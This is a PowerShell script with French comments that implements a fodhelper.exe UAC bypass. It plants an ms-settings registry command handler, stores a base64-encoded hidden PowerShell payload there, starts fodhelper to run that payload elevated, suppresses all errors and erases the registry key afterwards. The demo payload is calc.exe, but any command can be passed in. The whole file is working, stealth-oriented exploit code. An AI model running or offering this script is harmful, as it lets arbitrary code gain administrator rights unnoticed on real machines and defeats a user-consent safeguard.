function Invoke-SilentUACBypass {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]
        $Command = "powershell -nop -w hidden -c Start-Process calc.exe"
    )

    $ProgressPreference = 'SilentlyContinue'
    $ErrorActionPreference = 'Stop'

    # === IMPORTANT : Utiliser un nom fixe que fodhelper.exe va chercher ===
    $FakeCLSID = "ms-settings"
    $RegPath = "HKCU:\Software\Classes\$FakeCLSID\Shell\Open\Command"

    try {
        # Créer la structure de clés
        New-Item -Path $RegPath -Force | Out-Null
        New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value ([String]::Empty) -PropertyType String -Force | Out-Null

        # Préparer la commande encodée
        $Bytes = [Text.Encoding]::Unicode.GetBytes($Command)
        $EncodedCommand = [Convert]::ToBase64String($Bytes)
        $FinalPayload = "powershell -nop -w hidden -enc $EncodedCommand"

        Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $FinalPayload -Type String -Force | Out-Null

        # Démarrer fodhelper.exe (il va chercher HKCU\Software\Classes\ms-settings-*)
        # Le nom "ms-settings-*" est critique
        $ProcessArgs = @{
            FilePath     = "fodhelper.exe"
            WindowStyle  = "Hidden"
            Verb         = "RunAs"
            ErrorAction  = "SilentlyContinue"
        }
        Start-Process @ProcessArgs

        # Attendre un peu
        Start-Sleep -Seconds 2

    }
    catch {
        # Silencieux
    }
    finally {
        # Nettoyage
        $KeyPath = "HKCU:\Software\Classes\$FakeCLSID"
        if (Test-Path $KeyPath) {
            Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# === Appel correct ===
Invoke-SilentUACBypass -Command "Start-Process 'C:\Windows\System32\calc.exe'"


